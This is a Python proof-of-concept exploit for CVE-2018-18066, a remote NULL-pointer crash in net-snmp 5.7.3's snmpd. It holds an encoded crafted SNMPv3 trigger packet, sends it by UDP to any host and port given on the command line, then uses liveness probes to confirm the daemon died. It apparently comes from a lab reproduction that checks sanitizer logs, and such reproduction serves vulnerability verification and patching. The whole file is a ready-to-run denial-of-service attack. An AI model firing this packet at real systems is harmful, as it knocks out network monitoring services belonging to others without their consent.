#!/usr/bin/env python3
"""
CVE-2018-18066 PoC - net-snmp 5.7.3 snmpd remote NULL-pointer DoS.

NULL pointer dereference in snmp_oid_compare (snmplib/snmp_api.c): a crafted
SNMPv3 packet makes snmp_pdu_parse() link a varbind with a NULL OID name into
the PDU, which is then walked by snmp_oid_compare -> NULL deref.

Pure stdlib: decodes the known-working base64 packet from
dumpco.re/blog/net-snmp-5.7.3-remote-dos, sends it as one UDP datagram, then
fires follow-up GET probes to confirm the daemon is dead.

Usage: poc.py [host] [port]   (default 127.0.0.1 161)
"""
import base64
import socket
import sys

# Known-working SNMPv3 trigger packet (base64, newlines stripped on decode).
POC_B64 = (
    "MIG1AgEDMBECBACeXRsCAwD/4wQBBQIBAwQvMC0EDYAAH4iAWdxIYUWiYyICAQgCAgq5BAVwaXBw"
    "bwQMBVsKohj9MlusDerWBAAwbAQFgAAAAAYEAKFZAgQsGA29AgEAAgEAMEswDQEEAWFFg2MiBACh"
    "WQIELBgNvQIBAAIBADBLMA0GCSsGAQIBAgI1LjI1NS4wMCEGEisGNS4yNTUuMAEEAYF9CDMKAgEH"
    "CobetzgECzE3Mi4zMS4xOS4y"
)

# A plain SNMPv1 GET (sysDescr.0, community "public") used as a liveness probe.
# version=0, community=public, GET request, OID 1.3.6.1.2.1.1.1.0
LIVENESS_GET = bytes.fromhex(
    "302602010004067075626c6963a01902047a69b3c5020100020100"
    "300b300906052b060102010100"
)


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 161

    pkt = base64.b64decode(POC_B64)
    print(f"[*] Target: {host}:{port}/udp")
    print(f"[*] Decoded PoC packet: {len(pkt)} bytes")
    print(f"[*] First bytes (hex): {pkt[:16].hex()}")

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)

    print("[*] Sending crafted SNMPv3 trigger packet...")
    s.sendto(pkt, (host, port))

    # Follow-up liveness probes: if snmpd crashed, these time out / get no reply.
    alive = False
    for i in range(3):
        try:
            s.sendto(LIVENESS_GET, (host, port))
            data, _ = s.recvfrom(4096)
            print(f"[+] Liveness probe {i + 1}: got {len(data)} bytes reply -> daemon STILL ALIVE")
            alive = True
        except socket.timeout:
            print(f"[!] Liveness probe {i + 1}: timeout (no reply)")
        except Exception as e:  # noqa: BLE001
            print(f"[!] Liveness probe {i + 1}: {e!r}")

    s.close()

    if alive:
        print("[=] Daemon responded after the trigger; check docker logs for ASan abort anyway.")
        sys.exit(1)
    else:
        print("[=] No replies after trigger - daemon appears DEAD. Check docker logs for the ASan trace.")
        sys.exit(0)


if __name__ == "__main__":
    main()
